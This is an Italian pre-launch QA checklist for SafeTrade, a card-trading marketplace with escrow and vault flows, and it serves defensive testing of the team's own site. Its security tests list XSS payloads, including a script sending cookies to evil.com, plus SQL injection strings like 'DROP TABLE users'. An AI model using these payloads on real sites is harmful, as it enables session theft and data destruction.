# 🧪 SafeTrade — TEST CHECKLIST COMPLETA PRE-LANCIO

> **Per**: Founder solo | **Stack**: Next.js 14 + Supabase + Prisma + Cloudinary  
> **Tempo totale stimato**: ~8-10 ore (dividibile in sessioni)  
> **Legenda priorità**: 🔴 CRITICA | 🟡 ALTA | 🟢 BASSA  
> **Browser**: Chrome (C), Firefox (F), Safari (S), Mobile Chrome (MC), Mobile Safari (MS)

---

## SEZIONE 1: CRITICAL PATH (Tempo stimato: 90 min)

> Se questi test falliscono, il sito NON può andare live.

### 1.1 Registrazione Utente 🔴

- [ ] **CP-01** — Registrazione utente standard
  - **Passi**:
    1. Vai su `/signup`
    2. Compila: email valida, password (min 8 char), nome, cognome, città, provincia
    3. Lascia `maxDistance` al default (50km)
    4. Clicca "Registrati"
    5. Controlla email di verifica
    6. Clicca link di verifica
  - **Risultato atteso**: Account creato, redirect a `/onboarding` o `/dashboard`, email di verifica ricevuta entro 60s
  - **Browser**: C, F, S, MC, MS
  - **Priorità**: 🔴

- [ ] **CP-02** — Registrazione merchant
  - **Passi**:
    1. Vai su `/signup`, seleziona modalità merchant
    2. Compila dati utente + dati negozio (nome negozio, P.IVA, indirizzo)
    3. Invia
    4. Verifica che `MerchantApplication` sia creata con status `PENDING`
  - **Risultato atteso**: Account creato, applicazione merchant in attesa di approvazione admin, notifica admin ricevuta
  - **Browser**: C, MC
  - **Priorità**: 🔴

- [ ] **CP-03** — Registrazione con dati invalidi
  - **Passi**:
    1. Prova email malformata → errore
    2. Password < 8 caratteri → errore
    3. Città mancante → errore
    4. Email già registrata → errore specifico (non generico)
  - **Risultato atteso**: Messaggi di errore specifici per ogni campo, nessun account creato
  - **Browser**: C, F
  - **Priorità**: 🔴

### 1.2 Login / Logout 🔴

- [ ] **CP-04** — Login con credenziali valide
  - **Passi**:
    1. Vai su `/login`
    2. Inserisci email e password corrette
    3. Clicca "Accedi"
  - **Risultato atteso**: Redirect a `/dashboard`, sessione cookie impostata, header mostra nome utente
  - **Browser**: C, F, S, MC, MS
  - **Priorità**: 🔴

- [ ] **CP-05** — Login con credenziali errate
  - **Passi**:
    1. Email corretta + password sbagliata
    2. Email inesistente + qualsiasi password
  - **Risultato atteso**: Messaggio generico "Credenziali non valide" (NO "email non trovata" per sicurezza)
  - **Browser**: C, F
  - **Priorità**: 🔴

- [ ] **CP-06** — Logout completo
  - **Passi**:
    1. Logga, naviga su varie pagine
    2. Clicca "Logout"
    3. Prova ad accedere a `/dashboard` direttamente
  - **Risultato atteso**: Sessione distrutta, redirect a `/login`, nessun dato residuo in cookie/localStorage
  - **Browser**: C, MC
  - **Priorità**: 🔴

- [ ] **CP-07** — Persistenza sessione
  - **Passi**:
    1. Logga in Chrome
    2. Chiudi tab (non browser)
    3. Riaprila, vai su `/dashboard`
  - **Risultato atteso**: Ancora loggato (sessione persistente via cookie Supabase)
  - **Browser**: C, F, S
  - **Priorità**: 🟡

### 1.3 Creazione Listing 🔴

- [ ] **CP-08** — Crea listing di vendita completo
  - **Passi**:
    1. Logga come utente verificato
    2. Vai su `/listings/create`
    3. Compila: titolo, descrizione, tipo=SALE, prezzo, condizione, gioco (es. Pokemon), set, rarità
    4. Carica 2 immagini (jpg, < 5MB ciascuna)
    5. Pubblica
  - **Risultato atteso**: Listing creato, visibile su `/listings` (o in coda approvazione se utente nuovo), immagini caricate su Cloudinary
  - **Browser**: C, F, MC
  - **Priorità**: 🔴

- [ ] **CP-09** — Crea listing di scambio (TRADE)
  - **Passi**:
    1. Tipo = TRADE
    2. NON inserire prezzo
    3. Descrivi cosa cerchi in cambio
    4. Pubblica
  - **Risultato atteso**: Listing creato senza prezzo, badge "Scambio" visibile
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **CP-10** — Crea listing BOTH (vendita + scambio)
  - **Passi**:
    1. Tipo = BOTH, inserisci prezzo + descrizione scambio
    2. Pubblica
  - **Risultato atteso**: Listing mostra sia prezzo che opzione scambio
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **CP-11** — Auto-approvazione listing
  - **Passi**:
    1. Con utente verificato (email verificata O account >7gg O karma positivo)
    2. Crea listing
  - **Risultato atteso**: Listing auto-approvato, immediatamente visibile nel marketplace
  - **Browser**: C
  - **Priorità**: 🔴

### 1.4 Flusso Proposta → Transazione 🔴

- [ ] **CP-12** — Invio proposta d'acquisto
  - **Passi**:
    1. Logga come buyer (utente diverso dal seller)
    2. Vai su un listing attivo `/listings/[id]`
    3. Clicca "Proponi acquisto"
    4. Inserisci offerta, scegli chi paga fee (SELLER/BUYER/SPLIT)
    5. Invia
  - **Risultato atteso**: Proposta creata (status: PENDING), notifica al seller, proposta visibile in dashboard buyer
  - **Browser**: C, F, MC
  - **Priorità**: 🔴

- [ ] **CP-13** — Accettazione proposta e creazione transazione
  - **Passi**:
    1. Logga come seller
    2. Vai alle proposte ricevute
    3. Accetta proposta
    4. Scegli metodo escrow: LOCAL o VERIFIED
  - **Risultato atteso**: `SafeTradeTransaction` creata, status transazione aggiornato, notifica al buyer
  - **Browser**: C, MC
  - **Priorità**: 🔴

- [ ] **CP-14** — Rifiuto proposta
  - **Passi**:
    1. Logga come seller
    2. Rifiuta proposta
  - **Risultato atteso**: Proposta status=REJECTED, notifica al buyer, listing rimane attivo
  - **Browser**: C
  - **Priorità**: 🟡

### 1.5 Flusso Escrow LOCAL 🔴

- [ ] **CP-15** — Escrow in negozio completo
  - **Passi**:
    1. Da transazione accettata, scegli LOCAL
    2. Seleziona negozio VLS
    3. Prenota appuntamento
    4. [Simula] Merchant scansiona QR → verifica carte → carica foto verifica
    5. Rilascio fondi
  - **Risultato atteso**: Flusso completo: transazione COMPLETED, fondi rilasciati, audit log creato
  - **Browser**: C (desktop + mobile per QR scan)
  - **Priorità**: 🔴

### 1.6 Flusso Escrow VERIFIED 🔴

- [ ] **CP-16** — Escrow verificato completo
  - **Passi**:
    1. Da transazione, scegli VERIFIED
    2. Seleziona hub
    3. `/transaction/[id]/verified-escrow/setup` → setup spedizione
    4. Genera etichetta spedizione
    5. [Simula] Hub riceve → verifica → spedisce a buyer
    6. Auto-release dopo 72h (o conferma manuale)
  - **Risultato atteso**: Transazione completata, tracking aggiornato, fondi rilasciati
  - **Browser**: C
  - **Priorità**: 🔴

### 1.7 Admin Critical 🔴

- [ ] **CP-17** — Approvazione merchant
  - **Passi**:
    1. Logga come admin
    2. Vai su `/admin/applications`
    3. Trova applicazione PENDING
    4. Approva con nota
  - **Risultato atteso**: Ruolo utente → MERCHANT, Shop creato automaticamente, notifica al merchant
  - **Browser**: C
  - **Priorità**: 🔴

- [ ] **CP-18** — Approvazione listing manuale
  - **Passi**:
    1. Admin → `/admin/listings`
    2. Trova listing in attesa
    3. Approva
  - **Risultato atteso**: Listing visibile nel marketplace, notifica al creatore
  - **Browser**: C
  - **Priorità**: 🔴

---

## SEZIONE 2: FUNZIONALE / UX (Tempo stimato: 120 min)

### 2.1 Marketplace & Ricerca 🟡

- [ ] **FX-01** — Ricerca listing con filtri
  - **Passi**:
    1. Vai su `/listings`
    2. Applica filtro gioco = "Pokemon"
    3. Applica filtro condizione = "Near Mint"
    4. Applica range prezzo: 5€ - 50€
    5. Filtra per città
  - **Risultato atteso**: Solo listing corrispondenti mostrati, conteggio aggiornato, filtri persistono al refresh
  - **Browser**: C, F, MC
  - **Priorità**: 🟡

- [ ] **FX-02** — Paginazione listing
  - **Passi**:
    1. Assicurati ci siano >20 listing
    2. Scorri fino al fondo
    3. Clicca pagina successiva o infinite scroll
  - **Risultato atteso**: Nuovi listing caricati, nessun duplicato, smooth scroll
  - **Browser**: C, MC
  - **Priorità**: 🟡

- [ ] **FX-03** — Dettaglio listing
  - **Passi**:
    1. Clicca su un listing da `/listings`
    2. Verifica: titolo, prezzo, immagini (gallery funzionante), condizione, gioco, seller info
    3. Verifica pulsanti azione (proponi, contatta)
  - **Risultato atteso**: Tutte le info visibili, immagini zoomabili, CTA chiari
  - **Browser**: C, F, S, MC, MS
  - **Priorità**: 🟡

- [ ] **FX-04** — Early Access Premium
  - **Passi**:
    1. Crea listing come user premium
    2. Verifica visibilità con utente free (non deve vederlo per 24h)
    3. Verifica visibilità con utente premium (deve vederlo subito)
  - **Risultato atteso**: Listing visibile solo a premium per prime 24h
  - **Browser**: C
  - **Priorità**: 🟢

### 2.2 Community 🟡

- [ ] **FX-05** — Crea post nella community
  - **Passi**:
    1. Vai su `/community`
    2. Crea nuovo post: titolo, contenuto, topic
    3. Pubblica
  - **Risultato atteso**: Post visibile, username e timestamp corretti
  - **Browser**: C, MC
  - **Priorità**: 🟡

- [ ] **FX-06** — Sistema voti e karma
  - **Passi**:
    1. Vota post (upvote/downvote)
    2. Verifica conteggio voti aggiornato
    3. Verifica karma dell'autore aggiornato
  - **Risultato atteso**: Voto registrato, karma ricalcolato, non puoi votare il tuo post
  - **Browser**: C
  - **Priorità**: 🟢

- [ ] **FX-07** — Commenti
  - **Passi**:
    1. Apri un post
    2. Scrivi commento
    3. Rispondi a un commento esistente (nested)
  - **Risultato atteso**: Thread di commenti correttamente annidati
  - **Browser**: C, MC
  - **Priorità**: 🟢

### 2.3 Vault System 🟡

- [ ] **FX-08** — Creazione deposito vault
  - **Passi**:
    1. Vai su `/vault/deposit/new`
    2. Aggiungi items: gioco, nome carta, set, condizione, foto
    3. Invia deposito
  - **Risultato atteso**: Deposito creato (status: CREATED), visibile in `/vault/deposits`
  - **Browser**: C, MC
  - **Priorità**: 🟡

- [ ] **FX-09** — Flusso completo vault: deposito → assegnazione → vendita
  - **Passi**:
    1. Crea deposito (utente)
    2. [Admin/Hub] Segna come RECEIVED → IN_REVIEW → accetta items
    3. [Admin] Assegna items a negozio vault-enabled
    4. [Merchant] Scansiona QR slot → assegna item a slot (S01-S30)
    5. [Merchant] Registra vendita fisica O fulfilla ordine online
  - **Risultato atteso**: Item passa per tutti gli stati, VaultSplit creato (70/20/10), audit log completo
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **FX-10** — Richiesta case vault (merchant)
  - **Passi**:
    1. Logga come merchant
    2. Vai su `/merchant/vault/requests`
    3. Richiedi nuova case
    4. [Admin] Approva richiesta
    5. [Merchant] Conferma pagamento
  - **Risultato atteso**: Case assegnata, 30 slot disponibili, QR generati
  - **Browser**: C
  - **Priorità**: 🟡

### 2.4 Merchant Dashboard 🟡

- [ ] **FX-11** — Setup negozio completo
  - **Passi**:
    1. Logga come merchant approvato
    2. Vai su `/merchant/setup`
    3. Compila: nome, descrizione, logo, cover, indirizzo, orari, social
    4. Salva
    5. Verifica pagina pubblica `/shops/[slug]`
  - **Risultato atteso**: Negozio visibile con tutte le info, immagini caricate
  - **Browser**: C, MC
  - **Priorità**: 🟡

- [ ] **FX-12** — Gestione inventario
  - **Passi**:
    1. Merchant → `/merchant/inventory`
    2. Aggiungi prodotto (nome, prezzo, stock, condizione, immagine)
    3. Modifica prodotto
    4. Elimina prodotto
  - **Risultato atteso**: CRUD completo, prodotti visibili nel catalogo negozio
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **FX-13** — Creazione torneo
  - **Passi**:
    1. Merchant → `/merchant/tournaments/new`
    2. Compila: nome, gioco, data, max partecipanti, prezzo iscrizione
    3. Pubblica
  - **Risultato atteso**: Torneo visibile in `/tournaments`, iscrizione funzionante
  - **Browser**: C
  - **Priorità**: 🟢

### 2.5 Notifiche 🟡

- [ ] **FX-14** — Ricezione notifiche in-app
  - **Passi**:
    1. Invia proposta (da account buyer)
    2. Controlla NotificationBell del seller
  - **Risultato atteso**: Badge con conteggio, click mostra lista notifiche, click su notifica porta alla risorsa
  - **Browser**: C, MC
  - **Priorità**: 🟡

- [ ] **FX-15** — Admin notification bell
  - **Passi**:
    1. Simula evento admin (nuova application merchant, nuovo listing da approvare)
    2. Verifica AdminNotificationBell
  - **Risultato atteso**: Notifica admin separata, conteggio corretto
  - **Browser**: C
  - **Priorità**: 🟡

### 2.6 Profilo & Settings 🟢

- [ ] **FX-16** — Modifica profilo utente
  - **Passi**:
    1. Vai su `/dashboard/profile`
    2. Modifica nome, bio, passioni
    3. Salva
  - **Risultato atteso**: Dati aggiornati, visibili anche dagli altri utenti
  - **Browser**: C, MC
  - **Priorità**: 🟢

- [ ] **FX-17** — Onboarding flow
  - **Passi**:
    1. Registra nuovo utente
    2. Completa onboarding: passioni, bio, negozio preferito
  - **Risultato atteso**: Dati salvati, redirect a dashboard, onboarding non si ripresenta
  - **Browser**: C, MC
  - **Priorità**: 🟢

---

## SEZIONE 3: SICUREZZA BASE (Tempo stimato: 90 min)

> Verifiche manuali OWASP Top 10 senza tool enterprise.

### 3.1 Autenticazione & Autorizzazione 🔴

- [ ] **SEC-01** — Accesso pagine protette senza login
  - **Passi**:
    1. Apri browser incognito
    2. Naviga direttamente a: `/dashboard`, `/merchant/vault`, `/admin/users`, `/listings/create`
  - **Risultato atteso**: Redirect a `/login` per tutte le pagine protette
  - **Browser**: C, F
  - **Priorità**: 🔴

- [ ] **SEC-02** — Escalation ruoli (IDOR orizzontale)
  - **Passi**:
    1. Logga come USER normale
    2. Prova accedere a `/admin/applications`, `/admin/listings`, `/admin/vault/requests`
    3. Prova accedere a `/merchant/vault`, `/merchant/inventory`
  - **Risultato atteso**: 403 Forbidden o redirect, NO dati esposti
  - **Browser**: C
  - **Priorità**: 🔴

- [ ] **SEC-03** — IDOR sulle API (accesso risorse altrui)
  - **Passi**:
    1. Logga come User A
    2. Crea un listing, nota l'ID
    3. Logga come User B
    4. Chiama `PATCH /api/listings/[id-di-A]` con body modificato
    5. Chiama `DELETE /api/listings/[id-di-A]`
    6. Ripeti per proposte e depositi vault
  - **Risultato atteso**: 403 per ogni tentativo, nessuna modifica applicata
  - **Browser**: C (DevTools → Network → Edit and Resend)
  - **Priorità**: 🔴

- [ ] **SEC-04** — Enumerazione utenti
  - **Passi**:
    1. Su `/login`, prova email inesistente → nota messaggio errore
    2. Prova email esistente + password sbagliata → nota messaggio errore
    3. Su `/signup`, prova email già registrata → nota messaggio errore
  - **Risultato atteso**: Messaggi identici o generici (no differenza tra "utente non esiste" e "password sbagliata")
  - **Browser**: C
  - **Priorità**: 🔴

### 3.2 Injection & XSS 🔴

- [ ] **SEC-05** — XSS nei campi input
  - **Passi**:
    1. Crea listing con titolo: `<script>alert('XSS')</script>`
    2. Crea listing con descrizione: `<img src=x onerror=alert('XSS')>`
    3. Crea post community con: `javascript:alert(1)`
    4. Commento con: `<svg onload=alert(1)>`
    5. Profilo bio: `"><script>document.location='http://evil.com?c='+document.cookie</script>`
  - **Risultato atteso**: Testo renderizzato come testo puro (escaped), NESSUN popup alert, DOMPurify attivo
  - **Browser**: C, F
  - **Priorità**: 🔴

- [ ] **SEC-06** — SQL Injection (via Prisma)
  - **Passi**:
    1. Campo ricerca listing: `'; DROP TABLE users; --`
    2. Filtro prezzo: `1 OR 1=1`
    3. URL param: `/api/listings?game=Pokemon' OR '1'='1`
  - **Risultato atteso**: Nessun errore SQL esposto, query Prisma parametrizzate (Prisma previene di default, ma verifica che non ci siano raw queries)
  - **Browser**: C
  - **Priorità**: 🔴

### 3.3 Rate Limiting 🟡

- [ ] **SEC-07** — Rate limit su creazione listing
  - **Passi**:
    1. Crea >10 listing nello stesso minuto (usa DevTools/fetch rapido)
    2. Nota: limite è 10/ora
  - **Risultato atteso**: Dopo 10 listing, errore 429 Too Many Requests
  - **Browser**: C (DevTools Console)
  - **Priorità**: 🟡

- [ ] **SEC-08** — Rate limit su proposte
  - **Passi**:
    1. Invia >20 proposte in un'ora
  - **Risultato atteso**: Errore 429 dopo limite raggiunto
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **SEC-09** — Rate limit su pagamenti/escrow
  - **Passi**:
    1. Prova >10 chiamate a `/api/escrow/payments` in un'ora
    2. Prova >5 refund in un'ora
  - **Risultato atteso**: 429 con messaggio chiaro
  - **Browser**: C
  - **Priorità**: 🟡

### 3.4 Sessioni & Token 🔴

- [ ] **SEC-10** — Cookie di sessione sicuro
  - **Passi**:
    1. Logga e apri DevTools → Application → Cookies
    2. Verifica cookie Supabase: `HttpOnly`, `Secure`, `SameSite=Lax` (o Strict)
  - **Risultato atteso**: Tutti i flag di sicurezza presenti
  - **Browser**: C
  - **Priorità**: 🔴

- [ ] **SEC-11** — Token QR scadenza
  - **Passi**:
    1. Genera QR escrow
    2. Attendi scadenza (o modifica timestamp nel DB per test)
    3. Prova scansione
  - **Risultato atteso**: "Token scaduto" o errore chiaro
  - **Browser**: C, MC
  - **Priorità**: 🟡

### 3.5 Upload & File 🟡

- [ ] **SEC-12** — Upload file malevoli
  - **Passi**:
    1. Rinomina file `.php` in `.jpg` e prova upload su listing
    2. Prova upload file >10MB
    3. Prova upload file `.svg` (potenziale XSS)
    4. Prova upload file `.exe` rinominato `.png`
  - **Risultato atteso**: Rifiutato con errore chiaro, validazione MIME type (non solo estensione)
  - **Browser**: C
  - **Priorità**: 🟡

### 3.6 Audit & Logging 🟡

- [ ] **SEC-13** — Verifica audit log finanziario
  - **Passi**:
    1. Esegui flusso escrow completo
    2. Verifica nel DB che `AuditLog` contenga: tipo operazione, importo, utenti coinvolti, timestamp
  - **Risultato atteso**: Ogni operazione finanziaria loggata, nessuna operazione "fantasma"
  - **Browser**: C + DB client (Prisma Studio o pgAdmin)
  - **Priorità**: 🟡

- [ ] **SEC-14** — Log accessi non autorizzati
  - **Passi**:
    1. Prova accessi admin come user normale (SEC-02)
    2. Verifica che tentativi siano loggati
  - **Risultato atteso**: Security audit log con IP, user ID, risorsa tentata
  - **Browser**: C + DB
  - **Priorità**: 🟡

---

## SEZIONE 4: PERFORMANCE & ROBUSTEZZA (Tempo stimato: 60 min)

### 4.1 Caricamento Pagine 🟡

- [ ] **PERF-01** — Tempo caricamento pagine principali
  - **Passi**:
    1. DevTools → Network → Throttle a "Fast 3G"
    2. Naviga a: `/` , `/listings`, `/listings/[id]`, `/community`, `/dashboard`
    3. Nota LCP (Largest Contentful Paint) per ciascuna
  - **Risultato atteso**: LCP < 2.5s su 4G, < 4s su 3G per pagine critiche
  - **Browser**: C (Lighthouse)
  - **Priorità**: 🟡

- [ ] **PERF-02** — Lighthouse score
  - **Passi**:
    1. DevTools → Lighthouse → Performance + Accessibility + Best Practices
    2. Testa: homepage, listing page, dashboard
  - **Risultato atteso**: Performance >70, Accessibility >80, Best Practices >80
  - **Browser**: C
  - **Priorità**: 🟡

### 4.2 Immagini 🟡

- [ ] **PERF-03** — Lazy loading immagini
  - **Passi**:
    1. Vai su `/listings` con molti listing
    2. DevTools → Network → filter "img"
    3. Osserva che le immagini sotto il fold NON si caricano subito
    4. Scrolla → verifica caricamento progressivo
  - **Risultato atteso**: Solo immagini visibili caricate inizialmente, lazy load per il resto
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **PERF-04** — Ottimizzazione immagini Cloudinary
  - **Passi**:
    1. Carica immagine 5MB su listing
    2. Ispeziona URL Cloudinary dell'immagine renderizzata
    3. Verifica parametri di trasformazione (resize, quality, format)
  - **Risultato atteso**: Immagini servite ottimizzate (WebP/AVIF, dimensioni appropriate), non raw upload
  - **Browser**: C
  - **Priorità**: 🟢

### 4.3 Stress Test Manuale 🟡

- [ ] **PERF-05** — Tab multipli stesso utente
  - **Passi**:
    1. Apri 5 tab loggato come stesso utente
    2. In tab 1: crea listing
    3. Verifica visibilità in tab 2 (refresh)
    4. In tab 3: logout
    5. Verifica che tab 1,2 rilevino il logout
  - **Risultato atteso**: Stato consistente tra tab, logout propagato
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **PERF-06** — Molti listing in griglia
  - **Passi**:
    1. Assicurati di avere 100+ listing nel DB
    2. Vai su `/listings` senza filtri
    3. Osserva scroll performance
  - **Risultato atteso**: Smooth scroll, nessun freeze UI, paginazione funzionante
  - **Browser**: C, MC
  - **Priorità**: 🟡

### 4.4 Browser Compatibilità 🟡

- [ ] **PERF-07** — Layout cross-browser
  - **Passi**:
    1. Apri homepage + listing page + dashboard in: Chrome, Firefox, Safari
    2. Confronta visivamente
  - **Risultato atteso**: Nessun layout rotto, font consistenti, colori corretti
  - **Browser**: C, F, S
  - **Priorità**: 🟡

- [ ] **PERF-08** — Responsive breakpoints
  - **Passi**:
    1. DevTools → Responsive mode
    2. Testa breakpoints: 320px, 375px, 768px, 1024px, 1440px
    3. Pagine: homepage, listings, listing detail, dashboard, merchant dashboard
  - **Risultato atteso**: Layout adatta a ogni breakpoint, nessun overflow orizzontale, touch target ≥44px
  - **Browser**: C
  - **Priorità**: 🟡

### 4.5 Network Issues 🟡

- [ ] **PERF-09** — Comportamento offline
  - **Passi**:
    1. Logga, vai su dashboard
    2. DevTools → Network → Offline
    3. Prova navigazione
  - **Risultato atteso**: Messaggio "Sei offline" o fallback graceful, NO schermata bianca
  - **Browser**: C
  - **Priorità**: 🟢

- [ ] **PERF-10** — Connessione lenta
  - **Passi**:
    1. Throttle a "Slow 3G"
    2. Prova creazione listing con upload immagini
  - **Risultato atteso**: Loading state visibile, upload non si interrompe silenziosamente, errore chiaro se timeout
  - **Browser**: C
  - **Priorità**: 🟡

---

## SEZIONE 5: EDGE CASES (Tempo stimato: 90 min)

### 5.1 Input Strani 🟡

- [ ] **EDGE-01** — Campi con caratteri speciali
  - **Passi**:
    1. Nome listing: `Pokémon Charizard ✨ — "Mint" (1st Ed.)` 
    2. Descrizione con emoji: `🔥💎 Rarissima! Prezzo TOP`
    3. Prezzo con virgola: `12,50` (formato IT)
    4. Nome utente con apostrofo: `Dell'Orso`
  - **Risultato atteso**: Tutti salvati e visualizzati correttamente, nessun errore encoding
  - **Browser**: C, F
  - **Priorità**: 🟡

- [ ] **EDGE-02** — Campi vuoti e lunghezze limite
  - **Passi**:
    1. Titolo listing: 1 solo carattere → verifica minimo
    2. Titolo listing: 500 caratteri → verifica massimo
    3. Descrizione: 10.000 caratteri
    4. Prezzo: 0 → deve essere rifiutato?
    5. Prezzo: 999.999€ → limite massimo?
    6. Prezzo: -5 → deve essere rifiutato
    7. Prezzo: 0.001 → decimali eccessivi
  - **Risultato atteso**: Validazione client-side + server-side coerenti, errori chiari per ogni caso
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **EDGE-03** — Stringhe Unicode/RTL
  - **Passi**:
    1. Nome: `محمد` (arabo, RTL)
    2. Descrizione: `こんにちは` (giapponese)
    3. Input: stringa di 1000 emoji
  - **Risultato atteso**: Salvato senza crash, layout non rotto (può troncare se necessario)
  - **Browser**: C
  - **Priorità**: 🟢

### 5.2 Scenari Utente Reali 🟡

- [ ] **EDGE-04** — Doppia registrazione stessa email
  - **Passi**:
    1. Registra con email X
    2. In altra finestra incognito, registra di nuovo con email X
  - **Risultato atteso**: Errore chiaro "Email già registrata" (ma senza confermare che l'email esiste se possibile)
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **EDGE-05** — Comprare il proprio listing
  - **Passi**:
    1. Logga, crea listing
    2. Prova a inviare proposta al TUO listing
  - **Risultato atteso**: Bloccato con messaggio "Non puoi comprare il tuo listing"
  - **Browser**: C
  - **Priorità**: 🔴

- [ ] **EDGE-06** — Listing eliminato durante proposta
  - **Passi**:
    1. User A crea listing
    2. User B apre la pagina del listing
    3. User A elimina il listing
    4. User B prova a inviare proposta
  - **Risultato atteso**: Errore chiaro "Listing non più disponibile", no 500 error
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **EDGE-07** — Proposta su listing già venduto
  - **Passi**:
    1. Listing con proposta accettata → transazione in corso
    2. Altro utente prova a inviare proposta
  - **Risultato atteso**: "Listing non disponibile" o proposta rifiutata automaticamente
  - **Browser**: C
  - **Priorità**: 🔴

- [ ] **EDGE-08** — Merchant che perde ruolo durante operazione
  - **Passi**:
    1. Merchant sta gestendo vault
    2. [Admin] Revoca ruolo merchant
    3. Merchant prova a continuare operazione
  - **Risultato atteso**: Errore 403, redirect a dashboard utente, nessun danno ai dati
  - **Browser**: C
  - **Priorità**: 🟡

### 5.3 Navigazione Anomala 🟡

- [ ] **EDGE-09** — Back button durante checkout/escrow
  - **Passi**:
    1. Inizia flusso escrow
    2. Arriva a step 3
    3. Premi back button browser
    4. Premi back ancora
    5. Poi forward
  - **Risultato atteso**: Stato consistente, nessuna operazione duplicata, possibilità di riprendere
  - **Browser**: C, F, S
  - **Priorità**: 🟡

- [ ] **EDGE-10** — URL manipulation
  - **Passi**:
    1. Sei su `/transaction/abc123/verified-escrow/setup`
    2. Cambia `abc123` con ID random
    3. Cambia con ID di transazione di un altro utente
  - **Risultato atteso**: 404 per ID inesistente, 403 per ID altrui, NO dati esposti
  - **Browser**: C
  - **Priorità**: 🔴

- [ ] **EDGE-11** — Refresh durante submit form
  - **Passi**:
    1. Compila form creazione listing
    2. Clicca "Pubblica"
    3. IMMEDIATAMENTE refresh la pagina (F5)
  - **Risultato atteso**: O listing creato una sola volta, o errore gestito. MAI duplicato
  - **Browser**: C
  - **Priorità**: 🟡

### 5.4 Concorrenza 🟡

- [ ] **EDGE-12** — Due buyer sulla stessa carta
  - **Passi**:
    1. Listing con 1 item
    2. User B e User C inviano proposta quasi simultaneamente
    3. Seller accetta proposta B
    4. Proposta C deve aggiornarsi
  - **Risultato atteso**: Solo una transazione creata, proposta C automaticamente chiusa o notificata
  - **Browser**: C (2 finestre)
  - **Priorità**: 🔴

- [ ] **EDGE-13** — Doppio click su pulsanti critici
  - **Passi**:
    1. Doppio click su "Invia proposta"
    2. Doppio click su "Conferma pagamento"
    3. Doppio click su "Rilascia fondi"
  - **Risultato atteso**: Azione eseguita UNA SOLA volta, pulsante disabilitato dopo primo click
  - **Browser**: C, MC
  - **Priorità**: 🔴

- [ ] **EDGE-14** — QR scan multiplo
  - **Passi**:
    1. Merchant scansiona stesso QR escrow 2 volte rapidamente
    2. Scansiona QR slot vault 2 volte
  - **Risultato atteso**: Seconda scansione ignorata o messaggio "Già scansionato"
  - **Browser**: MC
  - **Priorità**: 🟡

### 5.5 Dati Boundary 🟢

- [ ] **EDGE-15** — Utente con 0 listing, 0 proposte, 0 transazioni
  - **Passi**:
    1. Nuovo utente, vai su dashboard
    2. Controlla tutte le sezioni: my listings, proposte, transazioni
  - **Risultato atteso**: Empty state con CTA appropriata ("Crea il tuo primo listing!"), no errori
  - **Browser**: C, MC
  - **Priorità**: 🟢

- [ ] **EDGE-16** — Vault slot tutti occupati (30/30)
  - **Passi**:
    1. Case con 30 slot occupati
    2. Merchant prova ad assegnare 31esimo item
  - **Risultato atteso**: Errore chiaro "Case piena", suggerimento di richiedere nuova case
  - **Browser**: C
  - **Priorità**: 🟡

- [ ] **EDGE-17** — Prezzo alert con 0 match
  - **Passi**:
    1. Crea alert per carta con prezzo < 0.01€
    2. Verifica che non generi errori nel background
  - **Risultato atteso**: Alert salvato, nessuna notifica inutile, nessun errore
  - **Browser**: C
  - **Priorità**: 🟢

---

## RIEPILOGO PRIORITÀ

| Priorità | Totale | Tempo stimato |
|----------|--------|---------------|
| 🔴 CRITICA | ~20 test | 3-4 ore |
| 🟡 ALTA | ~30 test | 4-5 ore |
| 🟢 BASSA | ~10 test | 1-2 ore |

**Strategia consigliata**: Completa tutti i 🔴 in una sessione, poi 🟡 in 2 sessioni, 🟢 quando hai tempo.

---

> **Ultimo aggiornamento**: Febbraio 2026  
> **Autore**: Testing Pre-Launch SafeTrade
